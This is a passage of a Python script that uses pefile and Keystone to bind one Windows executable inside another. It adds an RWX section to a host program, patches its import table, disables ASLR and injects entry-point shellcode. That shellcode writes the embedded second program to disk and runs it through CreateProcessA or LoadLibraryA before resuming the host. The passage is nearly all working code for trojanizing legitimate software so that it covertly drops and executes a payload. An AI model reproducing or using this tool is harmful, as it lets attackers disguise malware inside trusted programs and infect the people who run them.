    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+MapViewOfFile}], rax"))

    string = b"CloseHandle\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}], rax"))

    string = b"UnmapViewOfFile\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+UnmapViewOfFile}], rax"))

    string = b"CreateProcessA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateProcessA}], rax"))


    string = unpack_path + b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rcx")) # FileName
    write_instruction(pe, ks.asm("push 0")) # hTemplateFile = NULL
    write_instruction(pe, ks.asm("push 0x80")) # Attributes = FILE_ATTRIBUTE_NORMAL
    write_instruction(pe, ks.asm("push 2")) # Mode = CREATE_ALWAYS
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("mov r9, 0")) # pSecurity = NULL
    write_instruction(pe, ks.asm("mov r8, 1")) # SharedMode = FILE_SHARE_READ
    write_instruction(pe, ks.asm("mov rdx, 0xc0000000")) # Access = GENERIC_READ|GENERIC_WRITE
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileA}]"))
    write_instruction(pe, ks.asm("call rax")) # CreateFileA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}], rax")) # hFile

    write_instruction(pe, ks.asm("push 0")) # MapName = NULL
    write_instruction(pe, ks.asm(f"push {len(exe2_bytes)}")) # MaximumSizeLow
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("mov r9, 0")) # MaximumSizeHigh = NULL
    write_instruction(pe, ks.asm("mov r8, 4")) # Protection = PAGE_READWRITE
    write_instruction(pe, ks.asm("mov rdx, 0")) # pSecurity = NULL
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}")) # hFile
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileMappingA}]"))
    write_instruction(pe, ks.asm("call rax")) # CreateFileMappingA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}], rax")) # hMapObject
    
    write_instruction(pe, ks.asm(f"push {len(exe2_bytes)}")) # MapSize
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("push 0"))
    write_instruction(pe, ks.asm("mov r9, 0")) # OffsetLow = NULL
    write_instruction(pe, ks.asm("mov r8, 0")) # OffsetHigh = NULL
    write_instruction(pe, ks.asm("mov rdx, 0xf001f")) # AccessMode = FILE_MAP_ALL_ACCESS
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}")) # hMapObject
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+MapViewOfFile}]"))
    write_instruction(pe, ks.asm("call rax")) # MapViewOfFile()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+lpMapAddress}], rax")) # lpMapAddress
    write_instruction(pe, ks.asm("mov rdi, rax"))

    write_instruction(pe, ks.asm(f"mov rsi, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+file_content}"))
    write_instruction(pe, ks.asm(f"mov rcx, {len(exe2_bytes)}"))
    write_instruction(pe, ks.asm("rep movsb"))

    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+lpMapAddress}")) # lpMapAddress
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+UnmapViewOfFile}]"))
    write_instruction(pe, ks.asm("call rax")) # UnmapViewOfFile()

    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}")) # hMapObject
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}]"))
    write_instruction(pe, ks.asm("call rax")) # CloseHandle()

    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}")) # hFile
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}]"))
    write_instruction(pe, ks.asm("call rax")) # CloseHandle()

    if is_exe(exe2):
        string = command + b"\x00"
        write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
        write_bytes(pe, string)
        write_instruction(pe, ks.asm("pop rdx")) # lpCommandLine
        write_instruction(pe, ks.asm(f"mov rax, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+process_information}"))
        write_instruction(pe, ks.asm("push rax")) # lpProcessInformation
        write_instruction(pe, ks.asm(f"mov rax, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+startupinfoa}"))
        write_instruction(pe, ks.asm("push rax")) # lpStartupInfo
        write_instruction(pe, ks.asm("push 0")) # lpCurrentDirectory
        write_instruction(pe, ks.asm("push 0")) # lpEnvironment
        write_instruction(pe, ks.asm("push 0")) # dwCreationFlags
        write_instruction(pe, ks.asm("push 0")) # bInheritHandles
        write_instruction(pe, ks.asm("push 0"))
        write_instruction(pe, ks.asm("push 0"))
        write_instruction(pe, ks.asm("push 0"))
        write_instruction(pe, ks.asm("push 0"))
        write_instruction(pe, ks.asm("mov r9, 0")) # lpThreadAttributes
        write_instruction(pe, ks.asm("mov r8, 0")) # lpProcessAttributes
        write_instruction(pe, ks.asm("mov rcx, 0")) # lpApplicationName
        write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateProcessA}]"))
        write_instruction(pe, ks.asm("call rax")) # CreateProcessA()
    elif is_dll(exe2):
        string = unpack_path + b"\x00"
        write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
        write_bytes(pe, string)
        write_instruction(pe, ks.asm("pop rcx")) # lpLibFileName
        write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}]"))
        write_instruction(pe, ks.asm("call rax")) # LoadLibraryA()
    
    write_instruction(pe, ks.asm("call +5") )
    a = (addr-inject_section.VirtualAddress)
    write_instruction(pe, ks.asm("pop rax") )
    rw_section_distance = inject_section.VirtualAddress - rw_section.VirtualAddress + a
    write_instruction(pe, ks.asm("sub rax, 0x%x" % rw_section_distance) )
    write_instruction(pe, ks.asm("mov rsp, [rax]") )
    write_instruction(pe, ks.asm( "mov dword ptr[rax], 0x%x" % struct.unpack('<I',pe.get_data(rw_section.VirtualAddress,4))[0] ) )
    write_instruction(pe, ks.asm("popfq"))
    write_instruction(pe, ks.asm("pop r15"))
    write_instruction(pe, ks.asm("pop r14"))
    write_instruction(pe, ks.asm("pop r13"))
    write_instruction(pe, ks.asm("pop r12"))
    write_instruction(pe, ks.asm("pop r11"))
    write_instruction(pe, ks.asm("pop r10"))
    write_instruction(pe, ks.asm("pop r9"))
    write_instruction(pe, ks.asm("pop r8"))
    write_instruction(pe, ks.asm("pop rdi"))
    write_instruction(pe, ks.asm("pop rsi"))
    write_instruction(pe, ks.asm("pop rbp"))
    write_instruction(pe, ks.asm("pop rsp"))
    write_instruction(pe, ks.asm("pop rbx"))
    write_instruction(pe, ks.asm("pop rdx"))
    write_instruction(pe, ks.asm("pop rcx"))
    write_instruction(pe, ks.asm("pop rax"))

    a = addr
    for instr in orig_instrs:
        write_instruction(pe, ks.asm(instr, addr) )

    write_instruction(pe, ks.asm( "jmp -0x%x" % (addr-pe.OPTIONAL_HEADER.AddressOfEntryPoint-(addr-a)) ) )

    addr = inject_section.VirtualAddress+file_content
    write_bytes(pe, exe2_bytes)

    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
    pe.write(exe1)

def is_x64(exe):
    pe = pefile.PE(exe)
    if pe.NT_HEADERS.FILE_HEADER.Machine == 0x014c:
        return False
    elif pe.NT_HEADERS.FILE_HEADER.Machine == 0x8664:
        return True

exe1 = argv[1]
exe2 = argv[2]
exe2_args = argv[3] if len(argv) > 3 else ""

for exe in [exe1, exe2]:
    if not os.path.isfile(exe):
        print(f"[-] could not open {exe}")
        exit()

iat = patch_IAT(exe1)
disable_aslr(exe1)
add_section(exe1, ".join", 0x1000+len(open(exe2, 'rb').read()), "rwx")
chg_section(exe1, get_section_of_IAT(exe1), "w")
if is_x64(exe1):
    insert_code_64(exe1, exe2, exe2_args, iat)
else:
    insert_code_32(exe1, exe2, exe2_args, iat)
